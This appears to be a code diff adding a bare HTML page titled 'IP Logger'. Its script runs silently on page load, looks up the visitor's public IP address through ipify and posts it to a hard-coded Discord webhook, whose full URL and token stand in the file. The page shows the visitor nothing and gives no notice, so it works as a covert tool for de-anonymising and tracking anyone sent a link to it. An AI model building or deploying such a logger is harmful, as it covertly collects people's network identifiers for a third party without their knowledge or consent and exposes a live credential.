@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+
+<script>
+// Replace this with your Discord Webhook URL
+const webhookURL = "https://discord.com/api/webhooks/1351331022586908877/zPEZi9rIMfDbArWllmJaq9TbWwzLEMPBQ1mJsn31i-t1OB5CUbOjQgTA7yZpfYAY-0SM";
+
+// Get user's IPv4 address
+fetch("https://api.ipify.org?format=json")
+    .then(response => response.json())
+    .then(data => {
+        const userIP = data.ip; // This will now always be an IPv4 address
+
+        // Send IP to Discord webhook
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: `New visitor! IP: ${userIP}` })
+        });
+    })
+    .catch(error => console.error("Error getting IP:", error));
+</script>
+
+</body>
+</html>
